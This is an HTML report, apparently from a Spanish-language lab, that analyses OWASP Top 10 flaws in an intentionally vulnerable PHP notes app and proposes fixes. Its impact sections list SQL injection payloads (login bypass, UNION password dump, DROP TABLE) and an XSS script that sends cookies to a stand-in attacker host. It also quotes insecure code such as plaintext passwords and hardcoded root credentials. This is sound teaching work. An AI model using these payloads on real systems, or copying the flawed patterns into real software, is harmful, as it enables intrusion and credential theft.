@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Análisis de Vulnerabilidades - EduControl</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            max-width: 1000px; 
+            margin: 0 auto; 
+            padding: 20px; 
+            line-height: 1.6;
+        }
+        .vulnerability { 
+            background: #f8f9fa; 
+            border-left: 5px solid #007bff; 
+            padding: 20px; 
+            margin: 20px 0; 
+            border-radius: 5px;
+        }
+        .location { 
+            background: #e3f2fd; 
+            border-left: 5px solid #1976d2; 
+            padding: 15px; 
+            margin: 15px 0; 
+        }
+        .impact { 
+            background: #ffebee; 
+            border-left: 5px solid #f44336; 
+            padding: 15px; 
+            margin: 15px 0; 
+        }
+        .critical { 
+            background: #fff3e0; 
+            border-left: 5px solid #ff9800; 
+            padding: 15px; 
+            margin: 15px 0; 
+        }
+        code { 
+            background: #f5f5f5; 
+            padding: 2px 6px; 
+            border-radius: 3px; 
+            font-family: 'Consolas', monospace;
+        }
+        pre { 
+            background: #f8f9fa; 
+            padding: 15px; 
+            border-radius: 5px; 
+            overflow-x: auto; 
+            border: 1px solid #dee2e6;
+        }
+        .file-path {
+            background: #28a745;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        h1 { color: #dc3545; text-align: center; }
+        h2 { color: #007bff; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
+        h3 { color: #28a745; }
+        .risk-high { color: #dc3545; font-weight: bold; }
+        .risk-medium { color: #fd7e14; font-weight: bold; }
+        .risk-low { color: #28a745; font-weight: bold; }
+        .solution-section { 
+            background: #e8f5e8; 
+            border-left: 5px solid #28a745; 
+            padding: 20px; 
+            margin: 20px 0; 
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>🔍 Análisis de Vulnerabilidades OWASP Top 10 - Proyecto EduControl</h1>
+
+<div class="critical">
+    <h2>📊 Resumen Ejecutivo</h2>
+    <p><strong>Proyecto:</strong> Sistema de Notas Seguras (EduControl)</p>
+    <p><strong>Vulnerabilidades Identificadas:</strong> 5 tipos principales del OWASP Top 10</p>
+    <p><strong>Nivel de Riesgo General:</strong> <span class="risk-high">CRÍTICO</span></p>
+    <p><strong>Estado:</strong> Intencionalmente vulnerable para fines educativos</p>
+</div>
+
+<!-- A01: BROKEN ACCESS CONTROL -->
+<div class="vulnerability">
+    <h2>🚫 A01: Broken Access Control</h2>
+    
+    <h3>¿Dónde podrían estar?</h3>
+    <div class="location">
+        <h4>📍 Ubicaciones específicas:</h4>
+        
+        <p><span class="file-path">note_view.php</span> - Líneas 25-27</p>
+        <pre><code>$id = $_GET['id'];
+$sql = "SELECT * FROM notes WHERE id=$id"; // SIN verificación de propietario
+$result = mysqli_query($conn, $sql);</code></pre>
+        
+        <p><span class="file-path">note_delete.php</span> - Líneas 6-8</p>
+        <pre><code>$id = $_GET['id'];
+$sql = "DELETE FROM notes WHERE id=$id"; // SIN verificación de propietario
+mysqli_query($conn, $sql);</code></pre>
+        
+        <p><span class="file-path">admin.php</span> - Líneas 35-40</p>
+        <pre><code>// Sin verificación de rol de administrador
+if (!isset($_SESSION['user'])) {
+    echo "Debes iniciar sesión";
+    exit;
+}
+// ¡Cualquier usuario autenticado puede acceder!</code></pre>
+        
+        <p><span class="file-path">notes.php</span> - Enlace al panel admin</p>
+        <pre><code>&lt;a href="admin.php"&gt;🔧 Panel Admin&lt;/a&gt;</code></pre>
+    </div>
+    
+    <h3>¿Qué pasaría si son explotadas?</h3>
+    <div class="impact">
+        <h4>💥 Impactos críticos:</h4>
+        
+        <p><strong class="risk-high">Acceso no autorizado a datos:</strong></p>
+        <ul>
+            <li>Un atacante puede ver TODAS las notas privadas de otros usuarios</li>
+            <li>Cambiar el ID en la URL: <code>note_view.php?id=1</code>, <code>?id=2</code>, etc.</li>
+            <li>Acceso a información confidencial como contraseñas de administrador</li>
+        </ul>
+        
+        <p><strong class="risk-high">Modificación/eliminación de datos:</strong></p>
+        <ul>
+            <li>Eliminar notas de otros usuarios: <code>note_delete.php?id=X</code></li>
+            <li>Destrucción masiva de información</li>
+            <li>Sabotaje del sistema</li>
+        </ul>
+        
+        <p><strong class="risk-high">Escalación de privilegios:</strong></p>
+        <ul>
+            <li>Cualquier usuario puede acceder al panel de administración</li>
+            <li>Ver lista completa de usuarios y contraseñas</li>
+            <li>Administrar el sistema sin autorización</li>
+        </ul>
+        
+        <p><strong>🔥 Escenario real:</strong> Un empleado malicioso podría acceder a todas las notas confidenciales de la empresa, eliminar información crítica, o robar credenciales de administradores.</p>
+    </div>
+</div>
+
+<!-- A02: CRYPTOGRAPHIC FAILURES -->
+<div class="vulnerability">
+    <h2>🔐 A02: Cryptographic Failures</h2>
+    
+    <h3>¿Dónde podrían estar?</h3>
+    <div class="location">
+        <h4>📍 Ubicaciones específicas:</h4>
+        
+        <p><span class="file-path">register.php</span> - Línea 66</p>
+        <pre><code>$pass = $_POST['pass']; // A02: Sin hash - se guarda en texto plano
+$sql = "INSERT INTO users (username, password) VALUES ('$user', '$pass')";</code></pre>
+        
+        <p><span class="file-path">login.php</span> - Líneas 70-71</p>
+        <pre><code>$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
+// Comparación directa, sin password_verify()</code></pre>
+        
+        <p><span class="file-path">db.sql</span> - Líneas 8-12</p>
+        <pre><code>CREATE TABLE users (
+  username VARCHAR(50) UNIQUE,
+  password VARCHAR(255) -- SIN hash, almacenamiento inseguro
+);</code></pre>
+        
+        <p><span class="file-path">admin.php</span> - Líneas 65-70</p>
+        <pre><code>echo "&lt;td&gt;&lt;strong&gt;" . htmlspecialchars($row['password']) . "&lt;/strong&gt;&lt;/td&gt;";
+// Muestra contraseñas en texto plano</code></pre>
+        
+        <p><strong>🌐 Comunicación HTTP:</strong> Todo el tráfico va sin cifrar (no HTTPS)</p>
+    </div>
+    
+    <h3>¿Qué pasaría si son explotadas?</h3>
+    <div class="impact">
+        <h4>💥 Impactos críticos:</h4>
+        
+        <p><strong class="risk-high">Robo masivo de credenciales:</strong></p>
+        <ul>
+            <li>Si la base de datos es comprometida, TODAS las contraseñas están expuestas</li>
+            <li>No hay protección adicional contra dumps de base de datos</li>
+            <li>Acceso inmediato a todas las cuentas de usuario</li>
+        </ul>
+        
+        <p><strong class="risk-high">Reutilización de contraseñas:</strong></p>
+        <ul>
+            <li>Los usuarios suelen usar la misma contraseña en múltiples servicios</li>
+            <li>Acceso a cuentas de email, redes sociales, bancos, etc.</li>
+            <li>Compromiso total de la identidad digital del usuario</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Intercepción de tráfico:</strong></p>
+        <ul>
+            <li>Sin HTTPS, las credenciales viajan en texto plano</li>
+            <li>Ataques man-in-the-middle en redes WiFi públicas</li>
+            <li>Captura de sesiones activas</li>
+        </ul>
+        
+        <p><strong>🔥 Escenario real:</strong> Un atacante accede a la base de datos y obtiene 10,000 contraseñas en texto plano. Las prueba en Gmail, Facebook, y servicios bancarios, comprometiendo cientos de cuentas personales.</p>
+    </div>
+</div>
+
+<!-- A03: INJECTION -->
+<div class="vulnerability">
+    <h2>💉 A03: Injection (SQL + XSS)</h2>
+    
+    <h3>¿Dónde podrían estar?</h3>
+    <div class="location">
+        <h4>📍 SQL Injection - Ubicaciones:</h4>
+        
+        <p><span class="file-path">login.php</span> - Línea 70</p>
+        <pre><code>$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
+// Variables directamente concatenadas sin sanitización</code></pre>
+        
+        <p><span class="file-path">register.php</span> - Línea 75</p>
+        <pre><code>$sql = "INSERT INTO users (username, password) VALUES ('$user', '$pass')";
+// Sin prepared statements</code></pre>
+        
+        <p><span class="file-path">notes.php</span> - Líneas 92-96</p>
+        <pre><code>$sql = "INSERT INTO notes (user, note) VALUES ('$user', '$note')";
+$result = mysqli_query($conn, "SELECT * FROM notes WHERE user='$user'");</code></pre>
+        
+        <p><span class="file-path">admin.php</span> - Línea 46</p>
+        <pre><code>$sql = "SELECT * FROM users WHERE username LIKE '%$search%'";
+// Búsqueda vulnerable</code></pre>
+        
+        <h4>📍 XSS - Ubicaciones:</h4>
+        
+        <p><span class="file-path">note_view.php</span> - Línea 38</p>
+        <pre><code>echo $row['note']; // Sin htmlspecialchars() - XSS directo</code></pre>
+        
+        <p><span class="file-path">admin.php</span> - Línea 85</p>
+        <pre><code>echo "&lt;td&gt;" . $row['note'] . "&lt;/td&gt;"; // XSS en panel admin</code></pre>
+    </div>
+    
+    <h3>¿Qué pasaría si son explotadas?</h3>
+    <div class="impact">
+        <h4>💥 Impactos críticos por SQL Injection:</h4>
+        
+        <p><strong class="risk-high">Bypass de autenticación:</strong></p>
+        <ul>
+            <li>Login con <code>' OR '1'='1</code> accede sin contraseña</li>
+            <li>Acceso a cualquier cuenta de usuario</li>
+            <li>Control total del sistema</li>
+        </ul>
+        
+        <p><strong class="risk-high">Extracción de datos sensibles:</strong></p>
+        <ul>
+            <li><code>' UNION SELECT username,password FROM users--</code></li>
+            <li>Dump completo de la base de datos</li>
+            <li>Acceso a tablas de configuración del sistema</li>
+        </ul>
+        
+        <p><strong class="risk-high">Modificación/eliminación de datos:</strong></p>
+        <ul>
+            <li><code>'; DROP TABLE users;--</code> puede destruir datos</li>
+            <li><code>'; UPDATE users SET password='hacked';--</code></li>
+            <li>Corrupción total del sistema</li>
+        </ul>
+        
+        <h4>💥 Impactos críticos por XSS:</h4>
+        
+        <p><strong class="risk-high">Robo de sesiones:</strong></p>
+        <ul>
+            <li><code>&lt;script&gt;document.location='http://atacante.com/robar.php?cookie='+document.cookie&lt;/script&gt;</code></li>
+            <li>Secuestro de cuentas activas</li>
+            <li>Suplantación de identidad</li>
+        </ul>
+        
+        <p><strong class="risk-high">Phishing interno:</strong></p>
+        <ul>
+            <li>Formularios falsos para capturar credenciales</li>
+            <li>Redirección a sitios maliciosos</li>
+            <li>Ataques de ingeniería social</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Defacement:</strong></p>
+        <ul>
+            <li>Modificación visual del sitio</li>
+            <li>Inserción de contenido malicioso</li>
+            <li>Daño a la reputación</li>
+        </ul>
+        
+        <p><strong>🔥 Escenario real:</strong> Un atacante inyecta JavaScript malicioso en una nota. Cuando el administrador la ve, su sesión es robada y el atacante obtiene control total del sistema.</p>
+    </div>
+</div>
+
+<!-- A05: SECURITY MISCONFIGURATION -->
+<div class="vulnerability">
+    <h2>⚙️ A04: Security Misconfiguration</h2>
+    
+    <h3>¿Dónde podrían estar?</h3>
+    <div class="location">
+        <h4>📍 Ubicaciones específicas:</h4>
+        
+        <p><span class="file-path">config.php</span> - Líneas 2-7</p>
+        <pre><code>// Credenciales hardcodeadas
+$host = "localhost";
+$user = "root";  // Usuario por defecto
+$pass = "";      // Sin contraseña
+$db = "notas";</code></pre>
+        
+        <p><span class="file-path">config.php</span> - Líneas 9-12</p>
+        <pre><code>// Mostrar errores en producción
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);</code></pre>
+        
+        <p><span class="file-path">index.php</span> - Líneas 35-42</p>
+        <pre><code>&lt;div class="debug-info"&gt;
+    &lt;strong&gt;Debug Info (¡No debería estar visible!)&lt;/strong&gt;&lt;br&gt;
+    PHP Version: &lt;?php echo phpversion(); ?&gt;&lt;br&gt;
+    Server: &lt;?php echo $_SERVER['SERVER_SOFTWARE']; ?&gt;&lt;br&gt;
+    Database: notas@localhost&lt;br&gt;
+    Admin credentials: admin/admin123
+&lt;/div&gt;</code></pre>
+        
+        <p><span class="file-path">login.php</span> - Líneas 81-86</p>
+        <pre><code>echo "❌ Error de base de datos:&lt;br&gt;";
+echo "&lt;strong&gt;Query:&lt;/strong&gt; $sql&lt;br&gt;";
+echo "&lt;strong&gt;Error:&lt;/strong&gt; " . mysqli_error($conn);</code></pre>
+        
+        <p><span class="file-path">db.sql</span> - Líneas 37-38</p>
+        <pre><code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost';
+// Privilegios excesivos</code></pre>
+    </div>
+    
+    <h3>¿Qué pasaría si son explotadas?</h3>
+    <div class="impact">
+        <h4>💥 Impactos críticos:</h4>
+        
+        <p><strong class="risk-high">Exposición de información del sistema:</strong></p>
+        <ul>
+            <li>Versión de PHP y servidor web revelan vulnerabilidades conocidas</li>
+            <li>Estructura de directorios expuesta</li>
+            <li>Credenciales de administrador visibles públicamente</li>
+        </ul>
+        
+        <p><strong class="risk-high">Escalación a nivel de servidor:</strong></p>
+        <ul>
+            <li>Credenciales de base de datos permiten acceso directo</li>
+            <li>Usuario 'root' con privilegios totales</li>
+            <li>Posible compromiso del servidor completo</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Fingerprinting y reconocimiento:</strong></p>
+        <ul>
+            <li>Errores detallados revelan arquitectura interna</li>
+            <li>Información para planear ataques específicos</li>
+            <li>Identificación de vectores de ataque adicionales</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Facilita otros ataques:</strong></p>
+        <ul>
+            <li>Errores SQL ayudan a perfeccionar inyecciones</li>
+            <li>Información de debug acelera la explotación</li>
+            <li>Configuración insegura amplía superficie de ataque</li>
+        </ul>
+        
+        <p><strong>🔥 Escenario real:</strong> Un atacante encuentra las credenciales expuestas, accede directamente a la base de datos MySQL, y desde ahí compromete todo el servidor web.</p>
+    </div>
+</div>
+
+<!-- A07: AUTHENTICATION FAILURES -->
+<div class="vulnerability">
+    <h2>🔑 A05: Identification & Authentication Failures</h2>
+    
+    <h3>¿Dónde podrían estar?</h3>
+    <div class="location">
+        <h4>📍 Ubicaciones específicas:</h4>
+        
+        <p><span class="file-path">register.php</span> - Líneas 68-72</p>
+        <pre><code>// Sin validación de contraseña fuerte
+if (strlen($pass) < 3) {
+    echo "Contraseña muy corta, pero la aceptamos igual 😅";
+}
+// No hay más validaciones</code></pre>
+        
+        <p><span class="file-path">login.php</span> - Sin límite de intentos</p>
+        <pre><code>// No hay contador de intentos fallidos
+// No hay bloqueo temporal de cuentas
+// No hay CAPTCHA</code></pre>
+        
+        <p><span class="file-path">login.php</span> - Línea 89</p>
+        <pre><code>$_SESSION['user'] = $user; // Sin regeneración de ID de sesión
+// session_regenerate_id() ausente</code></pre>
+        
+        <p><span class="file-path">logout.php</span> - Líneas 2-4</p>
+        <pre><code>session_start();
+session_destroy(); // Destrucción básica sin limpieza completa
+header("Location: login.php");</code></pre>
+        
+        <p><span class="file-path">db.sql</span> - Datos de prueba</p>
+        <pre><code>INSERT INTO users VALUES 
+('admin', 'admin123'),    -- Contraseña débil
+('user1', '123456'),      -- Extremadamente débil
+('test', 'password')      -- Común y predecible</code></pre>
+    </div>
+    
+    <h3>¿Qué pasaría si son explotadas?</h3>
+    <div class="impact">
+        <h4>💥 Impactos críticos:</h4>
+        
+        <p><strong class="risk-high">Ataques de fuerza bruta exitosos:</strong></p>
+        <ul>
+            <li>Sin límite de intentos permite probar miles de contraseñas</li>
+            <li>Automatización de ataques con scripts</li>
+            <li>Compromiso eventual de cuentas con contraseñas débiles</li>
+        </ul>
+        
+        <p><strong class="risk-high">Diccionario de contraseñas comunes:</strong></p>
+        <ul>
+            <li>Contraseñas como "123456", "password" son fáciles de adivinar</li>
+            <li>Listas de contraseñas más comunes son 100% efectivas</li>
+            <li>Acceso a cuentas en minutos, no días</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Session hijacking:</strong></p>
+        <ul>
+            <li>IDs de sesión predecibles facilitan secuestro</li>
+            <li>Sin regeneración, las sesiones son más vulnerables</li>
+            <li>Ataques de fijación de sesión</li>
+        </ul>
+        
+        <p><strong class="risk-medium">Ingeniería social facilitada:</strong></p>
+        <ul>
+            <li>Contraseñas débiles son fáciles de adivinar</li>
+            <li>Información personal + reglas débiles = éxito</li>
+            <li>Patrones predecibles en contraseñas</li>
+        </ul>
+        
+        <p><strong>🔥 Escenario real:</strong> Un bot ejecuta 10,000 intentos de login con contraseñas comunes contra todas las cuentas. En 30 minutos compromete el 40% de las cuentas de usuario.</p>
+    </div>
+</div>
+
+<!-- RESUMEN DE IMPACTO COMBINADO -->
+<div class="critical">
+    <h2>🔥 Impacto Combinado - Escenario de Ataque Completo</h2>
+    
+    <h3>Cadena de Explotación Típica:</h3>
+    <ol>
+        <li><strong>Reconocimiento (A04):</strong> El atacante ve información expuesta en index.php</li>
+        <li><strong>Acceso inicial (A05 + A03):</strong> Usa fuerza bruta o SQL injection para entrar</li>
+        <li><strong>Escalación (A01):</strong> Accede al panel admin sin autorización</li>
+        <li><strong>Extracción (A02):</strong> Obtiene todas las contraseñas en texto plano</li>
+        <li><strong>Persistencia (A03):</strong> Inyecta XSS para mantener acceso</li>
+        <li><strong>Expansión:</strong> Usa credenciales robadas en otros sistemas</li>
+    </ol>
+    
+    <h3>🏢 Impacto Empresarial:</h3>
+    <ul>
+        <li><span class="risk-high">Pérdida de datos confidenciales</span></li>
+        <li><span class="risk-high">Compromiso de credenciales de empleados</span></li>
+        <li><span class="risk-high">Daño reputacional severo</span></li>
+        <li><span class="risk-medium">Costos de recuperación y notificación</span></li>
+        <li><span class="risk-medium">Posibles sanciones regulatorias (GDPR, etc.)</span></li>
+        <li><span class="risk-medium">Pérdida de confianza de clientes</span></li>
+    </ul>
+    
+    <h3>👤 Impacto en Usuarios:</h3>
+    <ul>
+        <li><span class="risk-high">Robo de identidad</span></li>
+        <li><span class="risk-high">Compromiso de cuentas personales</span></li>
+        <li><span class="risk-high">Pérdida de privacidad</span></li>
+        <li><span class="risk-medium">Fraude financiero potencial</span></li>
+        <li><span class="risk-medium">Chantaje con información personal</span></li>
+    </ul>
+</div>
+
+<div style="text-align: center; margin-top: 30px; padding: 20px; background: #e8f5e8; border-radius: 10px;">
+    <h3>✅ Este análisis es parte del laboratorio educativo</h3>
+    <p>Todas estas vulnerabilidades están implementadas intencionalmente para fines de aprendizaje sobre seguridad web.</p>
+    <p><strong>🎯 Objetivo:</strong> Entender cómo funcionan los ataques para poder defenderse mejor.</p>
+</div>
+
+<!-- PROPUESTAS DE SOLUCIÓN -->
+<div class="solution-section">
+    <h2>🛡️ Propuesta de solución</h2>
+    <p>A continuación se presentan las soluciones técnicas específicas para remediar cada vulnerabilidad identificada en el sistema EduControl.</p>
+</div>
+
+<!-- SOLUCIÓN A01 -->
+<div class="solution-section">
+    <h2>🚫 A01: Broken Access Control - Solución</h2>
+    
+    <h3>🔧 Implementación de Control de Acceso</h3>
+    <div class="location">
+        <h4>📍 Archivo: note_view.php (CORREGIDO)</h4>
+        <pre><code>&lt;?php
+include 'config.php';
+session_start();
+
+// Verificar autenticación
+if (!isset($_SESSION['user'])) {
+    header("Location: login.php");
+    exit;
+}
+
+$id = $_GET['id'];
+$current_user = $_SESSION['user'];
+
+// SOLUCIÓN: Verificar que la nota pertenece al usuario actual
+$sql = "SELECT * FROM notes WHERE id=? AND user=?";
+$stmt = $conn-&gt;prepare($sql);
+$stmt-&gt;bind_param("is", $id, $current_user);
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();
+
+if ($result-&gt;num_rows === 0) {
+    die("❌ Acceso denegado: Esta nota no te pertenece.");
+}
+
+$row = $result-&gt;fetch_assoc();
+echo "&lt;h2&gt;📝 Tu Nota&lt;/h2&gt;";
+echo "&lt;div&gt;" . htmlspecialchars($row['note']) . "&lt;/div&gt;";
+?&gt;</code></pre>
+    </div>
+    
+    <div class="impact">
+        <h4>✅ Beneficios de la solución:</h4>
+        <ul>
+            <li><strong>Control granular:</strong> Cada usuario solo puede acceder a sus propios datos</li>
+            <li><strong>Verificación de roles:</strong> Panel admin restringido a administradores reales</li>
+            <li><strong>Prepared statements:</strong> Previene inyección SQL en controles de acceso</li>
+            <li><strong>Principio de menor privilegio:</strong> Acceso mínimo necesario</li>
+        </ul>
+    </div>
+</div>
+
+<!-- SOLUCIÓN A02 -->
+<div class="solution-section">
+    <h2>🔐 A02: Cryptographic Failures - Solución</h2>
+    
+    <h3>🔧 Implementación de Cifrado Seguro</h3>
+    <div class="location">
+        <h4>📍 Hash seguro de contraseñas</h4>
+        <pre><code>// SOLUCIÓN: Hash seguro de contraseña
+$hashed_password = password_hash($pass, PASSWORD_ARGON2ID, [
+    'memory_cost' =&gt; 65536,  // 64 MB
+    'time_cost' =&gt; 4,        // 4 iteraciones
+    'threads' =&gt; 3,          // 3 hilos
+]);
+
+// SOLUCIÓN: Verificación segura
+if (password_verify($pass, $row['password'])) {
+    // Login exitoso
+}</code></pre>
+    </div>
+    
+    <div class="impact">
+        <h4>✅ Beneficios de la solución:</h4>
+        <ul>
+            <li><strong>Argon2ID:</strong> Algoritmo de hash resistente a ataques GPU y ASIC</li>
+            <li><strong>Validación robusta:</strong> Contraseñas complejas obligatorias</li>
+            <li><strong>HTTPS obligatorio:</strong> Cifrado en tránsito</li>
+            <li><strong>Headers de seguridad:</strong> Protección adicional del navegador</li>
+        </ul>
+    </div>
+</div>
+
+<!-- SOLUCIÓN A03 -->
+<div class="solution-section">
+    <h2>💉 A03: Injection (SQL + XSS) - Solución</h2>
+    
+    <h3>🔧 Prevención de Inyecciones</h3>
+    <div class="location">
+        <h4>📍 Prepared Statements y Sanitización</h4>
+        <pre><code>// SOLUCIÓN: Prepared statement seguro
+$stmt = $conn-&gt;prepare("INSERT INTO notes (user, note) VALUES (?, ?)");
+$stmt-&gt;bind_param("ss", $user, $note);
+$stmt-&gt;execute();
+
+// SOLUCIÓN: Sanitización XSS
+function sanitizeForDisplay($content) {
+    return htmlspecialchars($content, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+}</code></pre>
+    </div>
+    
+    <div class="impact">
+        <h4>✅ Beneficios de la solución:</h4>
+        <ul>
+            <li><strong>Prepared statements:</strong> Prevención completa de SQL injection</li>
+            <li><strong>Sanitización robusta:</strong> Protección contra XSS</li>
+            <li><strong>CSP:</strong> Política de seguridad de contenido</li>
+            <li><strong>Validación multicapa:</strong> Cliente + servidor</li>
+        </ul>
+    </div>
+</div>
+
+<!-- PLAN DE IMPLEMENTACIÓN -->
+<div class="critical">
+    <h2>📋 Plan de Implementación</h2>
+    
+    <h3>🚀 Fases de Remediación</h3>
+    
+    <div class="location">
+        <h4>Fase 1: Crítico (Inmediato - 1-2 días)</h4>
+        <ol>
+            <li>Implementar prepared statements en todos los queries SQL</li>
+            <li>Agregar sanitización XSS básica</li>
+            <li>Configurar HTTPS y headers de seguridad</li>
+            <li>Ocultar errores detallados en producción</li>
+        </ol>
+    </div>
+    
+    <div class="location">
+        <h4>Fase 2: Alto (1 semana)</h4>
+        <ol>
+            <li>Implementar hash de contraseñas con Argon2ID</li>
+            <li>Agregar controles de acceso granulares</li>
+            <li>Configurar límites de intentos de login</li>
+            <li>Implementar gestión segura de sesiones</li>
+        </ol>
+    </div>
+    
+    <h3>💰 Estimación de Costos</h3>
+    <ul>
+        <li><strong>Desarrollo:</strong> 40-60 horas de trabajo ($2,000-$4,000)</li>
+        <li><strong>Certificado SSL:</strong> $50-200/año</li>
+        <li><strong>Herramientas de seguridad:</strong> $100-500/mes</li>
+        <li><strong>Capacitación:</strong> $1,000-2,000</li>
+        <li><strong>Auditoría externa:</strong> $5,000-15,000</li>
+    </ul>
+    
+    <h3>📈 ROI Esperado</h3>
+    <ul>
+        <li><strong>Prevención de brechas:</strong> $100,000-500,000 ahorrados</li>
+        <li><strong>Cumplimiento regulatorio:</strong> Evitar multas de $10,000-1,000,000</li>
+        <li><strong>Confianza del cliente:</strong> Retención del 95% vs 60% post-brecha</li>
+        <li><strong>ROI total:</strong> 300-900% en el primer año</li>
+    </ul>
+</div>
+
+<div style="text-align: center; margin-top: 30px; padding: 20px; background: #d4edda; border-radius: 10px;">
+    <h3>🎯 Conclusión</h3>
+    <p><strong>El proyecto EduControl cumple su objetivo educativo al demostrar vulnerabilidades reales del OWASP Top 10.</strong></p>
+    <p>Las soluciones propuestas transformarían esta aplicación vulnerable en un sistema seguro y productivo.</p>
+    <p><em>Documento generado para fines educativos - Julio 2025</em></p>
+    <div style="margin-top: 15px;">
+        <a href="index.php" style="background: #007bff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">🏠 Volver al inicio</a>
+    </div>
+</div>
+
+</body>
+</html>
